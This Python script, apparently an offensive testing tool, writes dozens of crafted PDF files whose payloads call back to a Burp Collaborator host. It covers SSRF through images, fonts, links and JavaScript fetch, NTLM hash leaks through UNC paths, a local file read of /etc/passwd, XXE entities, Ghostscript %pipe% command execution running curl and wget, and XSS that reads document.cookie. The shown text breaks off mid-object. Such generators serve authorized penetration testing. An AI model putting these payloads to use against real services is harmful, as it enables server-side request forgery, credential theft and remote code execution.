from pathlib import Path

def generate_pdf_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    base_url = f"http://{burp_collab}"
    
    vulns = {
        'ssrf': [],
        'ntlm': [],
        'lfi': [],
        'xxe': [],
        'rce': [],
        'xss': [],
    }
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    ntlm_dir = output_dir / 'ntlm'
    ntlm_dir.mkdir(exist_ok=True)
    lfi_dir = output_dir / 'lfi'
    lfi_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    rce_dir = output_dir / 'rce'
    rce_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    info_dir = output_dir / 'info'
    info_dir.mkdir(exist_ok=True)
    
    pdf_header = b'%PDF-1.4\n'
    pdf_trailer = b'\n%%EOF'
    
    pdf_ssrf1_xobject_image = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf1_xobject_image.pdf", 'wb') as f:
        f.write(pdf_ssrf1_xobject_image.encode())
    
    pdf_ssrf2_fontfile = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf2_fontfile.pdf", 'wb') as f:
        f.write(pdf_ssrf2_fontfile.encode())
    
    pdf_ssrf3_annot_uri = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf3_annot_uri.pdf", 'wb') as f:
        f.write(pdf_ssrf3_annot_uri.encode())
    
    pdf_ssrf4_gotor = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf4_gotor.pdf", 'wb') as f:
        f.write(pdf_ssrf4_gotor.encode())
    
    pdf_ssrf5_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 200
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf5_xmp.pdf", 'wb') as f:
        f.write(pdf_ssrf5_xmp.encode())
    
    pdf_ssrf6_icc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/ColorSpace <<
/CS1 4 0 R
>>
>>
>>
endobj
4 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf6_icc.pdf", 'wb') as f:
        f.write(pdf_ssrf6_icc.encode())
    
    pdf_ssrf7_embedded = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [(evil.zip) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 5 0 R
>>
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
5 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf7_embedded.pdf", 'wb') as f:
        f.write(pdf_ssrf7_embedded.encode())
    
    pdf_ssrf8_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 200
>>
stream
<?xml version="1.0"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf8_xfa.pdf", 'wb') as f:
        f.write(pdf_ssrf8_xfa.encode())
    
    pdf_ssrf9_js_import = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf9_js_import.pdf", 'wb') as f:
        f.write(pdf_ssrf9_js_import.encode())
    
    pdf_ssrf10_launch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /Launch
/F <<
/URI ({base_url}/evil.exe)
>>
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf10_launch.pdf", 'wb') as f:
        f.write(pdf_ssrf10_launch.encode())
    
    pdf_ssrf11_iframe = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf11_iframe.pdf", 'wb') as f:
        f.write(pdf_ssrf11_iframe.encode())
    
    pdf_ssrf12_xhr = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf12_xhr.pdf", 'wb') as f:
        f.write(pdf_ssrf12_xhr.encode())
    
    pdf_ssrf13_fetch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf13_fetch.pdf", 'wb') as f:
        f.write(pdf_ssrf13_fetch.encode())
    
    pdf_ssrf14_embed = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading embed"); var html = '<embed src="{base_url}/embed" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf14_embed.pdf", 'wb') as f:
        f.write(pdf_ssrf14_embed.encode())
    
    pdf_ssrf15_base = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading base"); var html = '<base href="{base_url}/base" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf15_base.pdf", 'wb') as f:
        f.write(pdf_ssrf15_base.encode())
    
    pdf_ssrf16_link = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading link"); var html = '<link rel="stylesheet" src="{base_url}/link" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf16_link.pdf", 'wb') as f:
        f.write(pdf_ssrf16_link.encode())
    
    pdf_ssrf17_script = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading script"); var html = '<script src="{base_url}/script"></script>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf17_script.pdf", 'wb') as f:
        f.write(pdf_ssrf17_script.encode())
    
    pdf_ssrf18_meta = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading meta"); var html = '<meta http-equiv="refresh" content="0; url={base_url}/meta/" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf18_meta.pdf", 'wb') as f:
        f.write(pdf_ssrf18_meta.encode())
    
    pdf_ssrf19_img = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading img"); var html = '<img src="{base_url}/img" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf19_img.pdf", 'wb') as f:
        f.write(pdf_ssrf19_img.encode())
    
    pdf_ssrf20_svg = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading svg"); var html = '<svg src="{base_url}/svg" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf20_svg.pdf", 'wb') as f:
        f.write(pdf_ssrf20_svg.encode())
    
    pdf_ssrf21_input = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading input"); var html = '<input type="image" src="{base_url}/input" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf21_input.pdf", 'wb') as f:
        f.write(pdf_ssrf21_input.encode())
    
    pdf_ssrf22_video = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading video"); var html = '<video src="{base_url}/video" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf22_video.pdf", 'wb') as f:
        f.write(pdf_ssrf22_video.encode())
    
    pdf_ssrf23_audio = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio"); var html = '<audio src="{base_url}/audio" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf23_audio.pdf", 'wb') as f:
        f.write(pdf_ssrf23_audio.encode())
    
    pdf_ssrf24_audio_source = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio source"); var html = '<audio><source src="{base_url}/audio-source"/></audio>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf24_audio_source.pdf", 'wb') as f:
        f.write(pdf_ssrf24_audio_source.encode())
    
    pdf_ntlm11_xobject_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI (\\\\{burp_collab}\\pwn.png)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ntlm_dir / "ntlm11_xobject_unc.pdf", 'wb') as f:
        f.write(pdf_ntlm11_xobject_unc.encode())
    
    pdf_ntlm12_font_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI (\\\\{burp_collab}\\font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ntlm_dir / "ntlm12_font_unc.pdf", 'wb') as f:
        f.write(pdf_ntlm12_font_unc.encode())
    
    pdf_lfi13_gotor_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F (file:///etc/passwd)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(lfi_dir / "lfi13_gotor_file.pdf", 'wb') as f:
        f.write(pdf_lfi13_gotor_file.encode())
    
    pdf_xxe14_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 300
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>Test</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xxe_dir / "xxe14_xmp.pdf", 'wb') as f:
        f.write(pdf_xxe14_xmp.encode())
    
    pdf_xxe15_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
        f.write(pdf_xxe15_xfa.encode())
    
    pdf_rce1_ghostscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 200
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce1_ghostscript.pdf", 'wb') as f:
        f.write(pdf_rce1_ghostscript.encode())
    
    pdf_rce2_postscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 150
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
/OutputFile (%pipe%wget {base_url}/rce-postscript) (w) file
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
        f.write(pdf_rce2_postscript.encode())
    
    pdf_xss1_js_sandbox_bypass = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss1_js_sandbox_bypass.pdf", 'wb') as f:
        f.write(pdf_xss1_js_sandbox_bypass.encode())
    
    pdf_xss2_data_uri = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss2_data_uri.pdf", 'wb') as f:
        f.write(pdf_xss2_data_uri.encode())
    
    pdf_xss3_annotation_injection = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
/Subtype /Text
/M (D:20210402013803+02'00)
/C [1 1 0]
/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
/P 3 0 R
/Contents (\\">'><details open ontoggle=confirm('XSS');>)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss3_annotation_injection.pdf", 'wb') as f:
        f.write(pdf_xss3_annotation_injection.encode())
    
    pdf_xss4_uri_details = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (\\">'><details open ontoggle=confirm\\(2\\);fetch('{base_url}/xss4');>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss4_uri_details.pdf", 'wb') as f:
        f.write(pdf_xss4_uri_details.encode())
    
    pdf_xss5_js_bypass_apis = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss5_js_bypass_apis.pdf", 'wb') as f:
        f.write(pdf_xss5_js_bypass_apis.encode())
    
    pdf_xss6_uri_javascript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss6_uri_javascript.pdf", 'wb') as f:
        f.write(pdf_xss6_uri_javascript.encode())
    
    pdf_xss7_annotation_v = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
